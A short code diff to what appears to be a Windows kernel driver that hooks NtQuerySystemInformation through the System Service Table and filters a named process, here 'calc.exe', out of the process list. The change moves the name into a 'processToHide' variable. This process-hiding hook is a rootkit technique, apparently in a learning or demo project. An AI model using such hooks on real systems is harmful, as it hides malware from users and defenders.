@@ -1,5 +1,7 @@
 #include <ntddk.h>
 
+const wchar_t* processToHide = L"calc.exe";
+
 // Declare the structure representing the System Service Table.
 typedef struct SystemServiceTable
 {
@@ -74,7 +76,7 @@ NTSTATUS HookNtQuerySystemInformation(ULONG SystemInformationClass, PVOID System
 		curr = next;
 		next = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)curr + curr->NextEntryOffset);
 
-		if (!wcscmp(L"calc.exe", next->ImageName.Buffer))
+		if (!wcscmp(processToHide, next->ImageName.Buffer))
 		{
 			DbgPrint("Found the calculator!\n");
 			if (next->NextEntryOffset == 0)
